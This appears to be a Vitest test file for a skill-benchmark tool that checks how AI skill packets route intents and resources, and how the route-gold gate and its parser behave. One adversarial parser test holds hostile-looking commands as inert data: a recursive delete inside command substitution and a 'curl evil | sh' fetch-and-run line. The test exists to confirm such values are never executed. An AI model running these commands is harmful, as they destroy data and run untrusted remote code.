import { describe, it, expect, afterAll } from 'vitest';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';

const SKILL_ROOT = resolve(__dirname, '..', '..', '..');
const SB = join(SKILL_ROOT, 'scripts', 'skill-benchmark');
const REPO_SKILLS = resolve(SKILL_ROOT, '..', '..');
const MCP_TOOLING = join(REPO_SKILLS, 'mcp-tooling');
const PACKETS = [
  'mcp-chrome-devtools', 'mcp-click-up', 'mcp-aside-devtools',
  'mcp-figma', 'mcp-refero', 'mcp-mobbin',
];

const { routeSkillResources, parseRouter } = require(join(SB, 'router-replay.cjs'));
const { loadPlaybookScenarios, parseExpectedResourcesGold, parseExpectedIntentGold } = require(join(SB, 'load-playbook-scenarios.cjs'));
const { evaluateRouteGold, reduceRouteGold, aggregate } = require(join(SB, 'score-skill-benchmark.cjs'));
const { run, isHubTypeSkill, resolveRouteGold } = require(join(SB, 'run-skill-benchmark.cjs'));
const { renderReport } = require(join(SB, 'build-report.cjs'));

const tempDirs: string[] = [];
function tempDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}
afterAll(() => {
  for (const dir of tempDirs) rmSync(dir, { recursive: true, force: true });
});

// ─────────────────────────────────────────────────────────────────────────────
// Hub-type detection + flag derivation
// ─────────────────────────────────────────────────────────────────────────────

describe('route-gold flag derivation (hub-vs-flat detection)', () => {
  it('detects a hub-type skill by hub-router.json and defaults the gate ON under auto', () => {
    const hub = tempDir('rg-hub-');
    writeFileSync(join(hub, 'hub-router.json'), '{}');
    const flat = tempDir('rg-flat-');
    expect(isHubTypeSkill(hub)).toBe(true);
    expect(isHubTypeSkill(flat)).toBe(false);
    expect(resolveRouteGold({}, hub)).toEqual({ mode: 'auto', enabled: true });
    expect(resolveRouteGold({}, flat)).toEqual({ mode: 'auto', enabled: false });
  });

  it('honors explicit on/off regardless of skill type and rejects junk values', () => {
    const flat = tempDir('rg-flat2-');
    expect(resolveRouteGold({ 'route-gold': 'on' }, flat).enabled).toBe(true);
    const hub = tempDir('rg-hub2-');
    writeFileSync(join(hub, 'hub-router.json'), '{}');
    expect(resolveRouteGold({ 'route-gold': 'off' }, hub).enabled).toBe(false);
    expect(() => resolveRouteGold({ 'route-gold': 'sometimes' }, flat)).toThrow(/invalid --route-gold/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// evaluateRouteGold semantics
// ─────────────────────────────────────────────────────────────────────────────

function skDocScenario(over: Record<string, unknown> = {}) {
  return {
    scenarioId: 'RG-001',
    classKind: 'routing',
    hasIntentGold: true,
    hasResourceGold: true,
    expectedIntent: 'MODE_A',
    expectedIntents: ['MODE_A'],
    expectedResources: ['references/a.md'],
    goldParseError: null,
    source: { shape: 'sk-doc' },
    ...over,
  };
}

describe('evaluateRouteGold', () => {
  it('passes on exact intent + exact resource assembly', () => {
    const row = evaluateRouteGold({
      scenario: skDocScenario(),
      observed: { observedIntents: ['MODE_A'], observedResources: ['references/a.md'] },
    });
    expect(row.applicable).toBe(true);
    expect(row.pass).toBe(true);
  });

  it('fails on a wrong intent and on extra assembled resources (exact-set for frontmatter gold)', () => {
    const wrongIntent = evaluateRouteGold({
      scenario: skDocScenario(),
      observed: { observedIntents: ['MODE_B'], observedResources: ['references/a.md'] },
    });
    expect(wrongIntent.pass).toBe(false);
    expect(wrongIntent.intentOk).toBe(false);
    const extraResource = evaluateRouteGold({
      scenario: skDocScenario(),
      observed: { observedIntents: ['MODE_A'], observedResources: ['references/a.md', 'references/leak.md'] },
    });
    expect(extraResource.pass).toBe(false);
    expect(extraResource.resourceOk).toBe(false);
  });

  it('maps the rejection labels none/defer/UNKNOWN to the empty intent set', () => {
    for (const label of ['none', 'defer', 'UNKNOWN']) {
      const pass = evaluateRouteGold({
        scenario: skDocScenario({ expectedIntent: label, expectedIntents: [label], expectedResources: [] }),
        observed: { observedIntents: [], observedResources: [] },
      });
      expect(pass.pass).toBe(true);
      const fail = evaluateRouteGold({
        scenario: skDocScenario({ expectedIntent: label, expectedIntents: [label], expectedResources: [] }),
        observed: { observedIntents: ['MODE_A'], observedResources: [] },
      });
      expect(fail.pass).toBe(false);
    }
  });

  it('uses must-include + forbidden-prefix semantics for sk-code-shape gold', () => {
    const scenario = skDocScenario({
      source: { shape: 'sk-code' },
      hasIntentGold: false,
      expectedIntent: null,
      expectedIntents: [],
      forbiddenResources: ['code-webflow/'],
    });
    const withExtras = evaluateRouteGold({
      scenario,
      observed: { observedIntents: [], observedResources: ['references/a.md', 'references/extra.md'] },
    });
    expect(withExtras.pass).toBe(true);
    const forbiddenLeak = evaluateRouteGold({
      scenario,
      observed: { observedIntents: [], observedResources: ['references/a.md', 'code-webflow/references/x.md'] },
    });
    expect(forbiddenLeak.pass).toBe(false);
  });

  it('treats a gold parse failure as a violation, never a silent skip', () => {
    const row = evaluateRouteGold({
      scenario: skDocScenario({ goldParseError: 'expected_intent value is present but unparseable' }),
      observed: { observedIntents: [], observedResources: [] },
    });
    expect(row.applicable).toBe(true);
    expect(row.pass).toBe(false);
    expect(row.reason).toBe('gold-parse-failure');
  });

  it('is inapplicable without gold and for browser/routed-out rows', () => {
    expect(evaluateRouteGold({
      scenario: skDocScenario({ hasIntentGold: false, hasResourceGold: false }),
      observed: { observedIntents: [], observedResources: [] },
    }).applicable).toBe(false);
    expect(evaluateRouteGold({
      scenario: skDocScenario({ classKind: 'browser' }),
      observed: { observedIntents: [], observedResources: [] },
    }).applicable).toBe(false);
    expect(evaluateRouteGold({
      scenario: skDocScenario(),
      observed: { routedOut: true },
    }).applicable).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Gate wiring: a violation flips the verdict only when the flag is on
// ─────────────────────────────────────────────────────────────────────────────

describe('route-gold gate verdict wiring', () => {
  const passingRow = {
    scenarioId: 'RG-OK', stage: 'routing', modeAScore: 100, applicable: true,
    dims: { d1intra: { score: 1 }, d2: { score: 1 }, d3: { score: 1 }, d1inter: { score: null }, d4: { score: null } },
    routeGold: { applicable: true, pass: true },
  };
  const violatingRow = {
    ...passingRow,
    scenarioId: 'RG-BAD',
    routeGold: {
      applicable: true, pass: false, intentOk: false, resourceOk: true,
      scenarioId: 'RG-BAD', expectedIntents: ['MODE_A'], observedIntents: ['MODE_B'],
      expectedResources: [], observedResources: [],
    },
  };
  const connectivity = { score: 100, gateFailed: false, findings: [] };

  it('reduceRouteGold counts rows, matches, and violations', () => {
    const summary = reduceRouteGold([passingRow, violatingRow], { mode: 'on', enabled: true });
    expect(summary).toMatchObject({ rows: 2, matches: 1, violations: 1, parseFailures: 0, failed: true });
  });

  it('an enforced violation flips the verdict to BLOCKED-BY-ROUTE-GOLD; disabled leaves it alone', () => {
    const blocked = aggregate({
      skillId: 't', skillRoot: null, scenarioRows: [passingRow, violatingRow],
      connectivity, traceMode: 'router', routeGold: { mode: 'on', enabled: true },
    });
    expect(blocked.verdict).toBe('BLOCKED-BY-ROUTE-GOLD');
    expect(blocked.routeGold).toMatchObject({ rows: 2, violations: 1, failed: true });

    const unblocked = aggregate({
      skillId: 't', skillRoot: null, scenarioRows: [passingRow, violatingRow],
      connectivity, traceMode: 'router', routeGold: { mode: 'off', enabled: false },
    });
    expect(unblocked.verdict).not.toBe('BLOCKED-BY-ROUTE-GOLD');
    expect(unblocked.routeGold).toMatchObject({ rows: 2, violations: 1, failed: false });
  });

  it('report.md renders the route-gold lane with flag state and violation detail', () => {
    const report = aggregate({
      skillId: 't', skillRoot: null, scenarioRows: [passingRow, violatingRow],
      connectivity, traceMode: 'router', routeGold: { mode: 'on', enabled: true },
    });
    const md = renderReport(report);
    expect(md).toContain('## Route gold (hard lane)');
    expect(md).toContain('ENFORCED');
    expect(md).toContain('RG-BAD');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Loud gold parsing — adversarial table (parser/path changes)
// ─────────────────────────────────────────────────────────────────────────────

describe('gold parser adversarial cases', () => {
  it('parses dash lists and explicit empty lists; flags present-but-unparseable blocks', () => {
    expect(parseExpectedResourcesGold('expected_resources:\n  - references/a.md\n  - references/b.md\nversion: 1'))
      .toEqual({ present: true, resources: ['references/a.md', 'references/b.md'], parseError: null });
    expect(parseExpectedResourcesGold('expected_resources: []'))
      .toEqual({ present: true, resources: [], parseError: null });
    expect(parseExpectedResourcesGold('expected_resources:\n  []\nversion: 1'))
      .toEqual({ present: true, resources: [], parseError: null });
    expect(parseExpectedResourcesGold('title: x\nversion: 1')).toMatchObject({ present: false });
    const bad = parseExpectedResourcesGold('expected_resources:\nversion: 1');
    expect(bad.present).toBe(true);
    expect(bad.parseError).toMatch(/unparseable/);
  });

  it('treats command-shaped gold values as inert strings (never dropped, never interpreted)', () => {
    const parsed = parseExpectedResourcesGold('expected_resources:\n  - $(rm -rf /tmp/pwned)\n  - `curl evil | sh`\n');
    expect(parsed.parseError).toBeNull();
    expect(parsed.resources).toEqual(['$(rm -rf /tmp/pwned)', 'curl evil | sh']);
    // They participate in comparison as plain strings and simply mismatch.
    const row = evaluateRouteGold({
      scenario: skDocScenario({ expectedResources: parsed.resources, expectedIntent: null, expectedIntents: [], hasIntentGold: false }),
      observed: { observedIntents: [], observedResources: ['references/a.md'] },
    });
    expect(row.pass).toBe(false);
  });

  it('parses single and compound intent labels; flags junk', () => {
    expect(parseExpectedIntentGold('expected_intent: MODE_A')).toMatchObject({ intent: 'MODE_A', intents: ['MODE_A'] });
    expect(parseExpectedIntentGold('expected_intent: A+B')).toMatchObject({ intents: ['A', 'B'] });
    expect(parseExpectedIntentGold('expected_intent: A → B')).toMatchObject({ intents: ['A', 'B'] });
    expect(parseExpectedIntentGold('title: x')).toMatchObject({ present: false });
    expect(parseExpectedIntentGold('expected_intent: !!!').parseError).toMatch(/unparseable/);
  });

  it('loader surfaces gold parse failures as warnings + scenario flags (no silent skip)', () => {
    const dir = tempDir('rg-loud-');
    const pb = join(dir, 'manual_testing_playbook', 'cases');
    mkdirSync(pb, { recursive: true });
    writeFileSync(join(pb, 'bad_intent.md'), '---\nid: BD-001\nexpected_intent: !!!\nexpected_resources:\n  - references/a.md\n---\nPrompt: do the thing\n');
    writeFileSync(join(pb, 'malformed.md'), '---\nid: BD-002\nexpected_intent: MODE_A\nno closing fence');
    const { scenarios, warnings } = loadPlaybookScenarios({ skillRoot: dir });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].goldParseError).toMatch(/expected_intent/);
    expect(warnings.some((w: string) => w.includes('BD-001') && w.includes('gold-parse-failure'))).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Replay vs documented-runtime parity for the fallback branch, per packet
// ─────────────────────────────────────────────────────────────────────────────

describe('mcp-tooling packet fallback parity (replay vs documented runtime)', () => {
  const ZERO_SIGNAL = 'Summarise this quarterly sales report into three bullet points.';
  const SCORED: Record<string, { prompt: string; intent: string; resources: string[] }> = {
    'mcp-chrome-devtools': { prompt: 'getting started, command not found', intent: 'INSTALL', resources: ['references/troubleshooting.md'] },
    'mcp-click-up': { prompt: 'Manage quarterly goals and key results', intent: 'MCP_ADVANCED', resources: ['references/mcp_tools.md'] },
    'mcp-aside-devtools': { prompt: 'install this, it is not installed', intent: 'INSTALL', resources: ['references/troubleshooting.md'] },
    'mcp-figma': { prompt: 'export a screenshot for the a11y audit', intent: 'INSPECT_EXPORT', resources: ['references/figma_cli_reference.md', 'references/tool_surface.md'] },
    'mcp-refero': { prompt: 'Show similar screens for this ui pattern', intent: 'SCREENS', resources: ['references/tool-surface.md'] },
    'mcp-mobbin': { prompt: 'Show the checkout ux flow journey', intent: 'FLOWS', resources: ['references/tool-surface.md'] },
  };

  it.each(PACKETS)('%s declares fallback-only semantics and a suggestion-based fallback branch', (packet) => {
    const root = join(MCP_TOOLING, packet);
    const text = readFileSync(join(root, 'SKILL.md'), 'utf8');
    expect(text).toContain('DEFAULT_RESOURCE_SEMANTICS = "fallback-only"');
    // The documented zero-score branch suggests the default instead of loading it.
    expect(text).toContain('"suggested_fallback"');
    const router = parseRouter(text, root);
    expect(router.defaultResourceSemantics).toBe('fallback-only');
  });

  it.each(PACKETS)('%s zero-score replay selects no intent and assembles no resource', (packet) => {
    const result = routeSkillResources({ skillRoot: join(MCP_TOOLING, packet), taskText: ZERO_SIGNAL });
    expect(result.intents).toEqual([]);
    expect(result.resources).toEqual([]);
  });

  it.each(PACKETS)('%s scored replay assembles exactly the declared intent resources (no default union)', (packet) => {
    const expected = SCORED[packet];
    const result = routeSkillResources({ skillRoot: join(MCP_TOOLING, packet), taskText: expected.prompt });
    expect(result.intents).toEqual([expected.intent]);
    expect([...result.resources].sort()).toEqual([...expected.resources].sort());
  });

  it('the ClickUp fallback branches no longer hard-load the fallback resource', () => {
    const text = readFileSync(join(MCP_TOOLING, 'mcp-click-up', 'SKILL.md'), 'utf8');
    expect(text).not.toContain('load_if_available("references/cupt_commands.md"');
    expect(text).toContain('DEFAULT_RESOURCE = "references/cupt_commands.md"');
  });

  it('the hub router declares the same fallback-only contract and defers with an empty assembly', () => {
    const hubPolicy = JSON.parse(readFileSync(join(MCP_TOOLING, 'hub-router.json'), 'utf8')).routerPolicy;
    expect(hubPolicy.defaultResourceSemantics).toBe('fallback-only');
    const result = routeSkillResources({ skillRoot: MCP_TOOLING, taskText: 'Use the MCP tool bridge for this.' });
    expect(result.intents).toEqual([]);
    expect(result.resources).toEqual([]);
  });

  it('a router with NO semantics declaration keeps the legacy default-resource union', () => {
    const dir = tempDir('rg-legacy-');
    mkdirSync(join(dir, 'references'), { recursive: true });
    writeFileSync(join(dir, 'references', 'a.md'), '# a\n');
    writeFileSync(join(dir, 'references', 'default.md'), '# default\n');
    writeFileSync(join(dir, 'SKILL.md'), [
      '---', 'name: legacy-union', '---', '# Legacy', '', '```python',
      'DEFAULT_RESOURCE = "references/default.md"',
      'INTENT_SIGNALS = {', '    "GO": {"weight": 4, "keywords": ["launch"]},', '}',
      'RESOURCE_MAP = {', '    "GO": ["references/a.md"],', '}', '```', '',
    ].join('\n'));
    const scored = routeSkillResources({ skillRoot: dir, taskText: 'launch it' });
    expect([...scored.resources].sort()).toEqual(['references/a.md', 'references/default.md']);
    const zero = routeSkillResources({ skillRoot: dir, taskText: 'nothing relevant' });
    expect(zero.resources).toEqual(['references/default.md']);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// End-to-end enforcement proof: an injected route-violating scenario fails the
// run when the gate is on and does not when the gate is off
// ─────────────────────────────────────────────────────────────────────────────

describe('end-to-end enforcement (scratch corpus, live corpus untouched)', () => {
  it('a previously-passing corpus with one injected violation flips to BLOCKED-BY-ROUTE-GOLD (exit 3); --route-gold off restores the old verdict', () => {
    const scratch = tempDir('rg-e2e-');
    const corpus = join(scratch, 'playbook');
    cpSync(join(MCP_TOOLING, 'manual_testing_playbook'), corpus, { recursive: true });
    const victim = join(corpus, 'hub_routing', 'chrome_devtools_browser_debug.md');
    writeFileSync(victim, readFileSync(victim, 'utf8')
      .replace('expected_intent: mcp-chrome-devtools', 'expected_intent: mcp-figma'));

    const outOn = join(scratch, 'out-on');
    const codeOn = run({ skill: MCP_TOOLING, 'outputs-dir': outOn, 'trace-mode': 'router', 'playbook-dir': corpus });
    const reportOn = JSON.parse(readFileSync(join(outOn, 'skill-benchmark-report.json'), 'utf8'));
    expect(reportOn.verdict).toBe('BLOCKED-BY-ROUTE-GOLD');
    expect(reportOn.routeGold).toMatchObject({ enabled: true, violations: 1 });
    expect(reportOn.routeGold.rows).toBeGreaterThan(0);
    expect(codeOn).toBe(3);

    const outOff = join(scratch, 'out-off');
    const codeOff = run({ skill: MCP_TOOLING, 'outputs-dir': outOff, 'trace-mode': 'router', 'playbook-dir': corpus, 'route-gold': 'off' });
    const reportOff = JSON.parse(readFileSync(join(outOff, 'skill-benchmark-report.json'), 'utf8'));
    expect(reportOff.verdict).not.toBe('BLOCKED-BY-ROUTE-GOLD');
    expect(reportOff.routeGold).toMatchObject({ enabled: false, violations: 1 });
    expect(codeOff).toBe(0);
  });

  it('a gold parse failure in the corpus fails an enforced run loudly', () => {
    const scratch = tempDir('rg-parse-');
    const corpus = join(scratch, 'playbook');
    cpSync(join(MCP_TOOLING, 'manual_testing_playbook'), corpus, { recursive: true });
    const victim = join(corpus, 'hub_routing', 'clickup_task_management.md');
    writeFileSync(victim, readFileSync(victim, 'utf8')
      .replace('expected_intent: mcp-click-up', 'expected_intent: !!!'));

    const out = join(scratch, 'out');
    const code = run({ skill: MCP_TOOLING, 'outputs-dir': out, 'trace-mode': 'router', 'playbook-dir': corpus });
    const report = JSON.parse(readFileSync(join(out, 'skill-benchmark-report.json'), 'utf8'));
    expect(report.verdict).toBe('BLOCKED-BY-ROUTE-GOLD');
    expect(report.routeGold.parseFailures).toBe(1);
    expect(report.parseWarnings.some((w: string) => w.includes('gold-parse-failure'))).toBe(true);
    expect(code).toBe(3);
  });

  it('the live mcp-tooling corpus passes with the gate enforced and route-gold rows above 0', () => {
    const scratch = tempDir('rg-live-');
    const code = run({ skill: MCP_TOOLING, 'outputs-dir': scratch, 'trace-mode': 'router' });
    const report = JSON.parse(readFileSync(join(scratch, 'skill-benchmark-report.json'), 'utf8'));
    expect(report.routeGold).toMatchObject({ enabled: true, violations: 0 });
    expect(report.routeGold.rows).toBeGreaterThan(0);
    expect(report.verdict).toBe('PASS');
    expect(code).toBe(0);
  });
});
